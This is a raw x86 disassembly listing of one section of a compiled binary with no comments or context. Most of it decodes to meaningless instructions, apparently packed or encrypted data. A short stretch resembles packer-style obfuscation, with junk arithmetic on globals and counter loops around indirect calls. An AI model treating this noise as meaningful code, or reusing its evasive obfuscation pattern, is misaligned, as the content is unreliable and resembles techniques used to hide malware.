  41d2ce:	or     eax,0xc50038ab
  41d2d3:	xor    dl,BYTE PTR [edi]
  41d2d5:	mul    dh
  41d2d7:	sbb    DWORD PTR [ecx+0x52],eax
  41d2da:	in     eax,dx
  41d2db:	in     eax,0xff
  41d2dd:	popa   
  41d2de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d2df:	push   ecx
  41d2e0:	push   0xffffffa3
  41d2e2:	xchg   ecx,eax
  41d2e3:	ja     0x41d2b1
  41d2e5:	stc    
  41d2e6:	scas   eax,DWORD PTR es:[edi]
  41d2e7:	loopne 0x41d2ca
  41d2e9:	jp     0x41d357
  41d2eb:	out    0xf,eax
  41d2ed:	aad    0xf1
  41d2ef:	sbb    ebp,DWORD PTR [edx-0x38]
  41d2f2:	or     DWORD PTR fs:[edx+ebp*8],edx
  41d2f6:	dec    esp
  41d2f7:	call   0xc87cbe1b
  41d2fc:	jmp    0x566fb1c0
  41d301:	inc    edi
  41d302:	push   eax
  41d303:	mov    ch,0xc3
  41d305:	(bad)  
  41d306:	jmp    0x9f5f:0xf0f023af
  41d30d:	sbb    ebp,DWORD PTR [eax+0x56216fbc]
  41d313:	mov    esp,0xd5921db4
  41d318:	jl     0x41d2eb
  41d31a:	popf   
  41d31b:	mov    DWORD PTR [esp+ebp*4],esi
  41d31e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d31f:	cmp    DWORD PTR [edx-0x57],esi
  41d322:	in     al,dx
  41d323:	addr16 adc eax,0xa0bda5cc
  41d329:	push   ss
  41d32a:	test   DWORD PTR [ecx],esp
  41d32c:	inc    edi
  41d32d:	gs fs int3 
  41d330:	xchg   esi,eax
  41d331:	push   ecx
  41d332:	ins    DWORD PTR es:[edi],dx
  41d333:	es inc ebp
  41d335:	mov    bh,0xd6
  41d337:	loop   0x41d2bb
  41d339:	jae    0x41d2de
  41d33b:	sahf   
  41d33c:	test   BYTE PTR [edx-0x6c],bh
  41d33f:	mov    ah,0xb3
  41d341:	jmp    0x3d553739
  41d346:	in     al,dx
  41d347:	ins    DWORD PTR es:[edi],dx
  41d348:	jmp    0xa9a0115
  41d34d:	js     0x41d2da
  41d34f:	lahf   
  41d350:	out    dx,eax
  41d351:	mov    ds:0x47d857c3,eax
  41d356:	mov    DWORD PTR [eax-0x8315812],esi
  41d35c:	popf   
  41d35d:	pop    ecx
  41d35e:	pop    eax
  41d35f:	enter  0xdd8b,0x93
  41d363:	jmp    0x8f93:0xa53acf0d
  41d36a:	repnz (bad) 
  41d36d:	scas   al,BYTE PTR es:[edi]
  41d36e:	in     al,0x9b
  41d370:	jl     0x41d385
  41d372:	xor    BYTE PTR [ebx-0x1e],ah
  41d375:	bswap  ecx
  41d377:	cmp    esi,DWORD PTR [edi+0x23b1081b]
  41d37d:	out    dx,eax
  41d37e:	(bad)  
  41d37f:	(bad)  [esi-0x22]
  41d382:	int    0xc6
  41d384:	aad    0x7
  41d386:	mov    ecx,0xd70301d8
  41d38b:	and    edx,ebx
  41d38d:	mov    DWORD PTR [ebp-0x4c],edx
  41d390:	xor    DWORD PTR ds:0x42a2d2,0x7dd7
  41d39a:	mov    edx,DWORD PTR [ebp+0x8]
  41d39d:	mov    ebx,DWORD PTR [ebp-0x48]
  41d3a0:	lea    edx,[ebx+edx*1+0x241fcdf]
  41d3a7:	mov    DWORD PTR [ebp-0x48],edx
  41d3aa:	mov    edx,DWORD PTR [ebp+0x8]
  41d3ad:	mov    ebx,0xfa5e1524
  41d3b2:	sub    ebx,edx
  41d3b4:	mov    DWORD PTR ds:0x42a27a,0x17
  41d3be:	cmp    DWORD PTR ds:0x42a27a,0x0
  41d3c5:	je     0x41d3ff
  41d3cb:	cmp    DWORD PTR ds:0x42a27a,0x25
  41d3d2:	jge    0x41d3ff
  41d3d8:	jmp    0x41d3ed
  41d3dd:	push   0x42a2be
  41d3e2:	push   0x429181
  41d3e7:	call   DWORD PTR ds:0x42a3ca
  41d3ed:	mov    edx,DWORD PTR ds:0x42a27a
  41d3f3:	dec    edx
  41d3f4:	mov    DWORD PTR ds:0x42a27a,edx
  41d3fa:	jmp    0x41d3be
  41d3ff:	add    ebx,DWORD PTR [ebp-0x44]
  41d402:	and    DWORD PTR ds:0x42a25a,ebx
  41d408:	mov    DWORD PTR [ebp-0x44],ebx
  41d40b:	mov    edx,DWORD PTR [ebp+0x8]
  41d40e:	sub    DWORD PTR ds:0x42a25e,0x69af
  41d418:	xor    edx,eax
  41d41a:	adc    DWORD PTR ds:0x42a2e6,0x774b
  41d424:	add    edx,esi
  41d426:	mov    DWORD PTR ds:0x42a2ae,0x6366
  41d430:	jne    0x418abe
  41d436:	jmp    0x421e4f
  41d43b:	adc    DWORD PTR ds:0x42a2d2,edx
  41d441:	mov    edx,DWORD PTR [ebp-0xc]
  41d444:	sub    DWORD PTR ds:0x42a2ae,0x4e6d
  41d44e:	sub    edx,esi
  41d450:	xor    edx,eax
  41d452:	sbb    DWORD PTR ds:0x42a2c6,0x8d4
  41d45c:	mov    DWORD PTR [ebp-0x5c],edx
  41d45f:	dec    DWORD PTR ds:0x42a2c2
  41d465:	mov    edx,DWORD PTR [ebp-0x10]
  41d468:	xor    DWORD PTR ds:0x42a2a2,0x42a286
  41d472:	mov    ebx,DWORD PTR [ebp-0x8]
  41d475:	and    DWORD PTR ds:0x42a2ca,0x42a292
  41d47f:	xor    edx,eax
  41d481:	xor    ebx,eax
  41d483:	add    DWORD PTR ds:0x42a29a,0x42a2c2
  41d48d:	sub    edx,ebx
  41d48f:	sub    edx,esi
  41d491:	xor    edx,eax
  41d493:	mov    DWORD PTR [ebp-0x10],edx
  41d496:	mov    edx,DWORD PTR [ebp-0x14]
  41d499:	mov    DWORD PTR [ebp+0x8],edx
  41d49c:	jmp    0x41f8db
  41d4a1:	sbb    edx,ebx
  41d4a3:	mov    edx,DWORD PTR [ebp+0x8]
  41d4a6:	sbb    ebx,DWORD PTR ds:0x42a25a
  41d4ac:	mov    ebx,DWORD PTR [ebp-0x8]
  41d4af:	xor    edx,eax
  41d4b1:	xor    ebx,eax
  41d4b3:	or     DWORD PTR ds:0x42a2f6,0x42a266
  41d4bd:	sub    edx,ebx
  41d4bf:	movzx  ebx,BYTE PTR ds:0x42a2a6
  41d4c6:	sbb    ebx,DWORD PTR ds:0x42a262
  41d4cc:	mov    DWORD PTR ds:0x42a2a6,ebx
  41d4d2:	sub    edx,esi
  41d4d4:	xor    edx,eax
  41d4d6:	mov    DWORD PTR [ebp+0x8],edx
  41d4d9:	mov    DWORD PTR ds:0x42a2b2,0x1f
  41d4e3:	cmp    DWORD PTR ds:0x42a2b2,0x0
  41d4ea:	je     0x41d526
  41d4f0:	cmp    DWORD PTR ds:0x42a2b2,0x21
  41d4f7:	jle    0x41d526
  41d4fd:	jmp    0x41d512
  41d502:	push   0x1ea3
  41d507:	push   0x42a29e
  41d50c:	call   DWORD PTR ds:0x42a3ce
  41d512:	xor    edx,edx
  41d514:	xor    edx,DWORD PTR ds:0x42a2b2
  41d51a:	dec    edx
  41d51b:	mov    DWORD PTR ds:0x42a2b2,edx
  41d521:	jmp    0x41d4e3
  41d526:	mov    edx,DWORD PTR [ebp+0x8]
  41d529:	mov    ebx,DWORD PTR [ebp-0x58]
  41d52c:	add    edx,0x5708fa
  41d532:	imul   edx,ebx
  41d535:	mov    DWORD PTR [ebp-0x58],edx
  41d538:	mov    edx,DWORD PTR [ebp+0x8]
  41d53b:	mov    ebx,DWORD PTR [ebp-0x54]
  41d53e:	add    edx,0x64f898
  41d544:	or     edx,ebx
  41d546:	mov    DWORD PTR [ebp-0x54],edx
  41d549:	jmp    0x41f8a1
  41d54e:	in     al,0xd
  41d550:	in     al,0xc4
  41d552:	xchg   BYTE PTR [esi-0x72a2f23c],al
  41d558:	retf   0xc6e7
  41d55b:	clc    
  41d55c:	retf   
  41d55d:	fwait
  41d55e:	dec    ebp
  41d55f:	fstp   TBYTE PTR [ebx+eax*4+0x46]
  41d563:	pop    esi
  41d564:	add    DWORD PTR [ebx-0x7e72c9cc],0xffffffca
  41d56b:	mov    ebx,0x2c290034
  41d570:	outs   dx,BYTE PTR ds:[esi]
  41d571:	inc    DWORD PTR [ebx]
  41d573:	stos   DWORD PTR es:[edi],eax
  41d574:	in     eax,dx
  41d575:	(bad)  
  41d576:	dec    eax
  41d577:	add    ebp,eax
  41d579:	enter  0x5d40,0x2d
  41d57d:	rol    bl,1
  41d57f:	je     0x41d598
  41d581:	mov    bh,0xac
  41d583:	sub    eax,0x57efc264
  41d588:	inc    eax
  41d589:	idiv   DWORD PTR [edx]
  41d58b:	inc    esi
  41d58c:	dec    esi
  41d58d:	out    0xbd,eax
  41d58f:	mov    DWORD PTR [edi+0x65609abd],edi
  41d595:	sar    ecx,1
  41d597:	test   DWORD PTR [ebx+0xa651d1f],0x27511c8
  41d5a1:	int    0xa5
  41d5a3:	out    0x71,eax
  41d5a5:	mov    DWORD PTR [ecx],0xfbc09cb9
  41d5ab:	lods   al,BYTE PTR ds:[esi]
  41d5ac:	sahf   
  41d5ad:	jb     0x41d5eb
  41d5af:	daa    
  41d5b0:	pop    eax
  41d5b1:	(bad)  
  41d5b2:	retf   
  41d5b3:	jg     0x41d55e
  41d5b5:	stos   DWORD PTR es:[edi],eax
  41d5b6:	lods   eax,DWORD PTR ds:[esi]
  41d5b7:	jmp    0x1979:0xc880bd5e
  41d5be:	inc    esp
  41d5bf:	jge    0x41d62f
  41d5c1:	push   0xc726d9fb
  41d5c6:	daa    
  41d5c7:	jns    0x41d5cb
  41d5c9:	ins    BYTE PTR es:[edi],dx
  41d5ca:	clc    
  41d5cb:	rdmsr  
  41d5cd:	push   es
  41d5ce:	mov    al,ds:0xd260d7e0
  41d5d3:	mov    ebp,0x7ae8fe85
  41d5d8:	dec    eax
  41d5d9:	(bad)  
  41d5da:	shr    BYTE PTR [edi-0xe],1
  41d5dd:	mov    ch,0x60
  41d5df:	aad    0xe2
  41d5e1:	out    dx,al
  41d5e2:	sub    DWORD PTR [edi-0x33],eax
  41d5e5:	or     ah,BYTE PTR [ebx]
  41d5e7:	aam    0x7f
  41d5e9:	mov    esi,0x95b01345
  41d5ee:	pop    ebp
  41d5ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d5f0:	mov    ebx,ecx
  41d5f2:	add    ebp,DWORD PTR [edi]
  41d5f4:	inc    esi
  41d5f5:	push   ebx
  41d5f6:	cdq    
  41d5f7:	fild   QWORD PTR [edx]
  41d5f9:	push   edx
  41d5fa:	mov    edi,0x3f3e0681
  41d5ff:	xchg   ebp,eax
  41d600:	int3   
  41d601:	dec    ecx
  41d602:	jno    0x41d63d
  41d604:	outs   dx,BYTE PTR ds:[esi]
  41d605:	push   ss
  41d606:	(bad)
  41d609:	jmp    0x56a6:0xd78f6631
  41d610:	fpatan 
  41d612:	dec    edx
  41d613:	xchg   DWORD PTR [edi-0x30],edx
  41d616:	loope  0x41d5e2
  41d618:	add    eax,0x1411c892
  41d61d:	adc    al,0x34
  41d61f:	fimul  WORD PTR [edi-0x4998bf6b]
  41d625:	in     eax,0x3d
  41d627:	mov    ah,0x41
  41d629:	aaa    
  41d62a:	push   ebx
  41d62b:	mov    cl,0xb5
  41d62d:	or     BYTE PTR [eax],cl
  41d62f:	stc    
  41d630:	pop    eax
  41d631:	pushf  
  41d632:	retf   
  41d633:	xchg   DWORD PTR [edx+0x41],edi
  41d636:	mov    dh,0xbd
  41d638:	xchg   edx,eax
  41d639:	iret   
  41d63a:	repz adc eax,0x7c65a36b
  41d640:	inc    edi
  41d641:	lods   eax,DWORD PTR ds:[esi]
  41d642:	xchg   ebx,ebx
  41d644:	push   esi
  41d645:	pop    ebx
  41d646:	pop    ds
  41d647:	inc    ebx
  41d648:	sub    DWORD PTR [ecx-0x3],0x56b67e75
  41d64f:	not    DWORD PTR [eax]
  41d651:	sbb    DWORD PTR [eax+0x30a8ae63],edx
  41d657:	inc    ecx
  41d658:	mov    ecx,es
  41d65a:	scas   eax,DWORD PTR es:[edi]
  41d65b:	out    dx,al
  41d65c:	out    dx,eax
  41d65d:	loop   0x41d66d
  41d65f:	rol    DWORD PTR [ebp+0x1e],0x51
  41d663:	jns    0x41d665
  41d665:	repz jbe 0x41d68f
  41d668:	call   0xc9f1:0xe79d770a
  41d66f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d670:	cmc    
  41d671:	xchg   esp,eax
  41d672:	xchg   esi,eax
  41d673:	pushf  
  41d674:	adc    ah,BYTE PTR [ecx+0x3]
  41d677:	repz mov al,0x77
  41d67a:	pop    edx
  41d67b:	test   bh,bl
  41d67d:	pushf  
  41d67e:	jnp    0x41d60c
  41d680:	sar    BYTE PTR fs:[esi+eiz*2],0x14
  41d685:	xor    al,0x99
  41d687:	into   
  41d688:	int    0xa8
  41d68a:	jne    0x41d697
  41d68c:	xchg   edi,eax
  41d68d:	sahf   
  41d68e:	and    ecx,esp
  41d690:	pop    ecx
  41d691:	std    
  41d692:	sbb    DWORD PTR [edi],esp
  41d694:	adc    BYTE PTR [edi-0x2fabeafe],ah
  41d69a:	out    0x63,al
  41d69c:	or     dh,BYTE PTR [ebx+0x2e7bbbe1]
  41d6a2:	mov    ecx,0xe0890751
  41d6a7:	popa   
  41d6a8:	lahf   
  41d6a9:	mov    esp,0xe3512f89
  41d6ae:	mov    BYTE PTR [edi-0x13428cc8],bh
  41d6b4:	rcr    BYTE PTR [esi],1
  41d6b6:	add    DWORD PTR [edi+0x34],eax
  41d6b9:	loopne 0x41d702
  41d6bb:	add    dl,BYTE PTR [edi-0x1c6bff78]
  41d6c1:	in     eax,dx
  41d6c2:	lea    eax,[edi+0x37b68bf9]
  41d6c8:	shl    BYTE PTR [edx+0x1fa3cf12],0xcb
  41d6cf:	dec    ecx
  41d6d0:	(bad)  
  41d6d1:	adc    ecx,DWORD PTR [eax+0x34]
  41d6d4:	xchg   ebx,eax
  41d6d5:	push   esi
  41d6d6:	mov    ds:0x313a1417,al
  41d6db:	mov    edx,0xa05aa1c4
  41d6e0:	scas   al,BYTE PTR es:[edi]
  41d6e1:	push   esi
  41d6e2:	push   ss
  41d6e3:	iret   
  41d6e4:	sbb    bh,BYTE PTR [ecx]
  41d6e6:	pop    edx
  41d6e7:	enter  0x118c,0x76
  41d6eb:	pop    edx
  41d6ec:	pop    es
  41d6ed:	aaa    
  41d6ee:	les    ebx,FWORD PTR [edi+edx*1-0x3d]
  41d6f2:	(bad)  
  41d6f3:	int    0xa8
  41d6f5:	sub    BYTE PTR [edx-0x6a],dh
  41d6f8:	and    edi,DWORD PTR [eax]
  41d6fa:	push   ss
  41d6fb:	in     eax,0xa4
  41d6fd:	mov    BYTE PTR [edi],al
  41d6ff:	test   ebp,0x621047f0
  41d705:	mov    ah,0xeb
  41d707:	dec    ebx
  41d708:	aad    0x96
  41d70a:	pop    eax
  41d70b:	mov    ds:0x6ace8754,eax
  41d710:	and    ch,BYTE PTR [ebx+0x41]
  41d713:	dec    ebx
  41d714:	sub    ecx,DWORD PTR [ecx-0x37858882]
  41d71a:	outs   dx,BYTE PTR ss:[esi]
  41d71c:	inc    ebp
  41d71d:	and    al,0x92
  41d71f:	cmp    DWORD PTR [esi-0x30],esi
  41d722:	in     al,dx
  41d723:	and    al,ah
  41d725:	popa   
  41d726:	(bad)  
  41d727:	stos   DWORD PTR es:[edi],eax
  41d728:	and    BYTE PTR [esi],dl
  41d72a:	fbld   TBYTE PTR [edi]
  41d72c:	cmp    edi,DWORD PTR ds:0xbe0a7938
  41d732:	cmp    al,0x72
  41d734:	lahf   
  41d735:	xchg   BYTE PTR [ecx+0x32],ah
  41d738:	test   al,0x89
  41d73a:	in     al,0xb1
  41d73c:	out    dx,al
  41d73d:	pop    ecx
  41d73e:	pusha  
  41d73f:	lahf   
  41d740:	inc    ebp
  41d741:	add    edx,DWORD PTR [edi-0x61ff0011]
  41d747:	and    ebx,esp
  41d749:	or     al,0xeb
  41d74b:	xchg   esp,eax
  41d74c:	(bad)  
  41d74d:	fsubr  QWORD PTR [edx]
  41d74f:	pop    ds
  41d750:	and    ebp,esp
  41d752:	xchg   ebp,eax
  41d753:	inc    esp
  41d754:	sahf   
  41d755:	sub    bh,al
  41d757:	je     0x41d798
  41d759:	pusha  
  41d75a:	fsub   DWORD PTR [edx]
  41d75c:	mov    dh,0x8b
  41d75e:	xor    al,dh
  41d760:	out    0xa,eax
  41d762:	jnp    0x41d775
  41d764:	clc    
  41d765:	std    
  41d766:	add    DWORD PTR [edi],ebx
  41d768:	sbb    ecx,ebp
  41d76a:	aam    0x40
  41d76c:	mov    cl,0xe5
  41d76e:	mov    dl,0xd0
  41d770:	data16 xlat BYTE PTR ds:[ebx]
  41d772:	mov    esi,0xefeb8d82
  41d777:	xchg   esi,eax
  41d778:	in     al,0xbf
  41d77a:	push   eax
  41d77b:	stc    
  41d77c:	dec    ebx
  41d77d:	xchg   ebx,eax
  41d77e:	xor    ebx,DWORD PTR [ebp-0x6a6f9de7]
  41d784:	add    edx,ecx
  41d786:	jae    0x41d70b
  41d788:	inc    edi
  41d789:	lods   al,BYTE PTR ds:[esi]
  41d78a:	icebp  
  41d78b:	inc    ebp
  41d78c:	aad    0xa8
  41d78e:	xor    BYTE PTR cs:[ebx],bh
  41d791:	test   eax,0xd953aa3e
  41d796:	and    ch,BYTE PTR [edi+edx*1]
  41d799:	adc    BYTE PTR [ecx-0x40877b8d],0x1b
  41d7a0:	frstor [ebp-0x70b5d4f7]
  41d7a6:	cmp    al,0x2c
  41d7a8:	pop    ss
  41d7a9:	push   ebp
  41d7aa:	sbb    DWORD PTR [eax-0x51f90dca],eax
  41d7b0:	mov    ecx,DWORD PTR [ecx-0x220fab52]
  41d7b6:	stc    
  41d7b7:	test   eax,0xe6c8950d
  41d7bc:	fnstcw WORD PTR [edx]
  41d7be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d7bf:	mov    ah,0x1e
  41d7c1:	jl     0x41d74a
  41d7c3:	or     ebx,DWORD PTR [edx-0x67b00534]
  41d7c9:	push   esp
  41d7ca:	(bad)  
  41d7cb:	dec    BYTE PTR [ecx+ebp*2]
  41d7ce:	repnz mov BYTE PTR [edi+0x1a],dh
  41d7d2:	(bad)  
  41d7d3:	fiadd  WORD PTR [esi+esi*1-0x3cbcf1ef]
  41d7da:	mov    bh,0xec
  41d7dc:	div    DWORD PTR [esi]
  41d7de:	sub    eax,0xe734604d
  41d7e3:	jnp    0x41d7c7
  41d7e5:	push   ds
  41d7e6:	xor    al,0xa8
  41d7e8:	icebp  
  41d7e9:	sbb    DWORD PTR [ebp+0x13],edx
  41d7ec:	mov    esi,0xb1c7f968
  41d7f1:	push   esp
  41d7f2:	call   DWORD PTR [eax*1+0x8cfe5c4]
  41d7f9:	mov    ecx,0x38a9c332
  41d7fe:	xchg   esi,eax
  41d7ff:	hlt    
  41d800:	fisttp DWORD PTR [edx+0x5b0622a8]
  41d806:	in     eax,dx
  41d807:	cmp    al,0xcf
  41d809:	sub    al,0x96
  41d80b:	push   ds
  41d80c:	daa    
  41d80d:	cwde   
  41d80e:	lea    ebx,[ebx]
  41d810:	push   eax
  41d811:	out    dx,eax
  41d812:	inc    eax
  41d813:	leave  
  41d814:	jae    0x41d88f
  41d816:	fwait
  41d817:	adc    BYTE PTR [ecx+0x3a7202cb],cl
  41d81d:	sbb    al,0xa7
  41d81f:	dec    eax
  41d820:	inc    ecx
  41d821:	mov    bl,0xde
  41d823:	mov    eax,ds:0xecb70f3f
  41d828:	inc    ebx
  41d829:	or     eax,DWORD PTR [ebx+0xbb75527]
  41d82f:	mov    ecx,DWORD PTR [eax]
  41d831:	push   edi
  41d832:	jecxz  0x41d879
  41d834:	jmp    0x55a6:0x9e743a68
  41d83b:	xchg   BYTE PTR [esi+0x7a],al
  41d83e:	mov    ah,0xa8
  41d840:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d841:	imul   esp,DWORD PTR [edi-0x1c],0x34278188
  41d848:	rep ins DWORD PTR es:[edi],dx
  41d84a:	clc    
  41d84b:	sti    
  41d84c:	in     al,dx
  41d84d:	sub    DWORD PTR [ebp+0xf44308e],0xffffff87
  41d854:	cmp    BYTE PTR [esi+0x2b],0x78
  41d858:	lahf   
  41d859:	mov    WORD PTR [ebp+0x53dfba77],ds
  41d85f:	aas    
  41d860:	dec    edx
  41d861:	into   
  41d862:	push   eax
  41d863:	les    esi,FWORD PTR [edx]
  41d865:	dec    eax
  41d866:	xor    BYTE PTR [ebx+0x506b466b],ah
  41d86c:	pop    esi
  41d86d:	daa    
  41d86e:	das    
  41d86f:	push   esi
  41d870:	test   DWORD PTR [ebp-0x121ac252],eax
  41d876:	mov    ds:0xcea6e450,eax
  41d87b:	ss push edx
  41d87d:	mov    dl,BYTE PTR [edx]
  41d87f:	lahf   
  41d880:	cli    
  41d881:	stc    
  41d882:	hlt    
  41d883:	loopne 0x41d8a3
  41d885:	leave  
  41d886:	fsub   st,st(2)
  41d888:	jg     0x41d884
  41d88a:	loopne 0x41d821
  41d88c:	mov    ah,0xf1
  41d88e:	dec    edx
  41d88f:	or     al,0x42
  41d891:	pop    ebx
  41d892:	stos   BYTE PTR es:[edi],al
  41d893:	xor    BYTE PTR [edi],ah
  41d895:	mov    ebx,0x350a67a
  41d89a:	loop   0x41d848
  41d89c:	shr    BYTE PTR [eax-0x207dc942],1
  41d8a2:	mov    ebx,0xd82e1af8
  41d8a7:	push   esp
  41d8a8:	sbb    BYTE PTR [edx-0x60d5ebcc],dl
  41d8ae:	mov    ?,WORD PTR ss:[ecx-0x6a]
  41d8b2:	xor    BYTE PTR [ecx-0x39353f7d],dh
  41d8b8:	mov    ds,WORD PTR [esi]
  41d8ba:	xchg   edx,eax
  41d8bb:	mov    cl,0x1c
  41d8bd:	mov    WORD PTR [ecx],?
  41d8bf:	iret   
  41d8c0:	sub    eax,0xdf33efd1
  41d8c5:	pop    edx
  41d8c6:	push   edx
  41d8c7:	and    eax,0xfd4e5d2d
  41d8cc:	inc    edx
  41d8cd:	push   0x3c
  41d8cf:	sbb    dh,BYTE PTR [ebp-0x5d7df2f7]
  41d8d5:	loopne 0x41d8ac
  41d8d7:	jb     0x41d91b
  41d8d9:	mov    ebx,0x52156eda
  41d8de:	nop
  41d8df:	mov    bh,cl
  41d8e1:	xchg   dl,al
  41d8e3:	xchg   esp,eax
  41d8e4:	xor    eax,0x4c457dc3
  41d8e9:	xchg   edi,esp
  41d8eb:	mov    ecx,eax
  41d8ed:	mov    cl,cl
  41d8ef:	dec    esp
  41d8f0:	lds    edx,FWORD PTR [ebx+0x2]
  41d8f3:	retf   
  41d8f4:	and    esp,DWORD PTR [ecx]
  41d8f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8f7:	ror    DWORD PTR [ecx+0x4fe72d47],1
  41d8fd:	or     edi,edx
  41d8ff:	dec    edx
  41d900:	js     0x41d974
  41d902:	push   ecx
  41d903:	jge    0x41d889
  41d905:	jo     0x41d97c
  41d907:	adc    ecx,DWORD PTR [esi+0x33]
  41d90a:	mov    bh,BYTE PTR [edx+edx*8+0x5a21dadd]
  41d911:	rcl    DWORD PTR [eax-0x52],cl
  41d914:	fst    QWORD PTR [edx+eax*8]
  41d917:	cwde   
  41d918:	add    bh,BYTE PTR [edx-0x3469ef0f]
  41d91e:	adc    edx,DWORD PTR cs:[esi+0x1113d880]
  41d925:	js     0x41d8b4
  41d927:	nop    DWORD PTR [eax]
  41d92a:	call   0x1f96:0x5a7acb5f
  41d931:	or     BYTE PTR [ebp-0x57],al
  41d934:	xlat   BYTE PTR ds:[ebx]
  41d935:	push   0xffffff8e
  41d937:	mov    ch,0x7a
  41d939:	sub    esp,DWORD PTR [eax+0x6c42cb8d]
  41d93f:	xchg   esi,eax
  41d940:	sbb    bl,0x6c
  41d943:	add    al,0x30
  41d945:	scas   eax,DWORD PTR es:[edi]
  41d946:	call   0xbdb2c035
  41d94b:	fmul   DWORD PTR [ecx+0x495fb5c3]
  41d951:	add    bl,BYTE PTR [ebx+0x50608c95]
  41d957:	adc    al,0xac
  41d959:	xor    BYTE PTR [esi+0x27de7f5b],cl
  41d95f:	add    al,0xe3
  41d961:	mov    DWORD PTR [eax+0x11],0x65c3796b
  41d968:	repz mov al,0xd8
  41d96b:	dec    edi
  41d96c:	int3   
  41d96d:	fincstp 
  41d96f:	inc    esi
  41d970:	jge    0x41d932
  41d972:	xor    al,BYTE PTR [ebp+0x3eef3483]
  41d978:	loop   0x41d901
  41d97a:	cli    
  41d97b:	nop
  41d97c:	inc    BYTE PTR [eax]
  41d97e:	int3   
  41d97f:	pop    es
  41d980:	cmovp  eax,DWORD PTR [edx+edx*2-0x7f9b0229]
  41d988:	repz or ebp,ecx
  41d98b:	dec    esi
  41d98c:	xchg   bl,cl
  41d98e:	add    edi,DWORD PTR [esi]
  41d990:	out    dx,al
  41d991:	pop    eax
  41d992:	sbb    DWORD PTR [esi+0x4ecc296a],ecx
  41d998:	and    eax,DWORD PTR [edx-0x41]
  41d99b:	loopne 0x41d9f4
  41d99d:	out    0x82,eax
  41d99f:	outs   dx,BYTE PTR ds:[esi]
  41d9a0:	fistp  QWORD PTR [ecx+ecx*1-0x2679b414]
  41d9a7:	adc    esp,DWORD PTR [edx]
  41d9a9:	and    al,0x4c
  41d9ab:	mov    al,ds:0x6dc72ab6
  41d9b0:	inc    edx
  41d9b1:	jmp    0xaf23:0xffeb72ea
  41d9b8:	inc    ebx
  41d9b9:	dec    ecx
  41d9ba:	xor    BYTE PTR ds:0xfbdbe8b7,bl
  41d9c0:	leave  
  41d9c1:	mov    WORD PTR [ebp+esi*2-0x137d3e0f],ds
  41d9c8:	add    ah,BYTE PTR [eax+0x23727730]
  41d9ce:	retf   
  41d9cf:	add    cl,dh
  41d9d1:	(bad)
  41d9d4:	inc    edx
  41d9d5:	fdivr  DWORD PTR [eax+0x432f9ba7]
  41d9db:	shl    DWORD PTR [edi+0x622e1c2a],cl
  41d9e1:	leave  
  41d9e2:	and    DWORD PTR [edx+ebx*1-0x23f2ddbd],ebx
  41d9e9:	call   0xb8143dc4
  41d9ee:	jg     0x41d9cb
  41d9f0:	lock pop ds
  41d9f2:	cmp    DWORD PTR [esi],ebx
  41d9f4:	retf   
  41d9f5:	pop    ebp
  41d9f6:	addr16 push ebp
  41d9f8:	xor    DWORD PTR [esi+0x7],esp
  41d9fb:	push   ecx
  41d9fc:	xor    dh,ah
  41d9fe:	adc    ebp,DWORD PTR [eax-0x4d]
  41da01:	mov    cs,WORD PTR [edx+eax*8]
  41da04:	fistp  DWORD PTR [eax]
  41da06:	sar    DWORD PTR [edx],0xda
  41da09:	push   ss
  41da0a:	add    DWORD PTR [ecx+0x70],esp
  41da0d:	hlt    
  41da0e:	aam    0x8c
  41da10:	cmp    eax,0x4b
  41da13:	aas    
  41da14:	popf   
  41da15:	inc    esi
  41da16:	jp     0x41d99f
  41da18:	rcl    al,0x6e
  41da1b:	icebp  
  41da1c:	stos   DWORD PTR es:[edi],eax
  41da1d:	jnp    0x41da4f
  41da1f:	test   DWORD PTR [ecx+0x1a],ebp
  41da22:	jmp    0x41da58
  41da24:	inc    ecx
  41da25:	das    
  41da26:	(bad)  
  41da27:	push   ebx
  41da28:	dec    ebp
  41da29:	ret    0xa0c2
  41da2c:	mov    eax,0x368cc24d
  41da31:	nop
  41da32:	cmc    
  41da33:	dec    ecx
  41da34:	popa   
  41da35:	mov    bl,0x79
  41da37:	jns    0x41da1f
  41da39:	xchg   BYTE PTR [eax+0x7f],cl
  41da3c:	xchg   ebp,eax
  41da3d:	std    
  41da3e:	mov    al,ds:0x13d5a691
  41da43:	jmp    DWORD PTR [ebp-0x51]
  41da46:	jo     0x41da14
  41da48:	loope  0x41d9e0
  41da4a:	push   0x473502e4
  41da4f:	stos   DWORD PTR es:[edi],eax
  41da50:	cdq    
  41da51:	ret    0x135f
  41da54:	push   esp
  41da55:	test   al,0x84
  41da57:	cmp    DWORD PTR ds:0x6f4815b4,edx
  41da5d:	xchg   DWORD PTR ds:[ecx-0x6feabac8],ebx
  41da64:	ds xchg ah,ch
  41da67:	sub    al,0x15
  41da69:	js     0x41da54
  41da6b:	pop    edx
  41da6c:	les    edi,FWORD PTR ds:0xadfff8cd
  41da72:	sbb    esi,DWORD PTR [ebx+0x5c]
  41da75:	int    0xb9
  41da77:	in     eax,dx
  41da78:	mov    ecx,0xe1f6f8bd
  41da7d:	xchg   ebx,eax
  41da7e:	add    eax,0x88b0a5d4
  41da83:	mov    bl,0x79
  41da85:	shl    DWORD PTR gs:[edx-0x1270305c],cl
  41da8c:	dec    esp
  41da8d:	mul    dh
  41da8f:	cmp    BYTE PTR [eax],0xd6
  41da92:	(bad)  
  41da93:	mov    ebx,0x8de02c56
  41da98:	test   eax,0x695f6513
  41da9d:	pop    edx
  41da9e:	or     DWORD PTR [ebp+0x53162c3c],0x6d
  41daa5:	arpl   WORD PTR [ecx+edx*1-0x3d],sp
  41daa9:	aad    0xb8
  41daab:	repnz lods eax,DWORD PTR ds:[esi]
  41daad:	xchg   DWORD PTR [esi+ebx*8],edi
  41dab0:	adc    eax,0x5738f5aa
  41dab5:	sbb    DWORD PTR [ecx],ebx
  41dab7:	sub    BYTE PTR [ebx-0xe],0xe2
  41dabb:	push   ebp
  41dabc:	push   ss
  41dabd:	sbb    edi,DWORD PTR [edx-0x4cc4ba00]
  41dac3:	inc    edi
  41dac4:	sub    ebp,DWORD PTR [edi]
  41dac6:	ret    
  41dac7:	test   al,0xc3
  41dac9:	and    al,cl
  41dacb:	fisub  WORD PTR [ebp+0x68a6d506]
  41dad1:	mov    eax,0xa317cce0
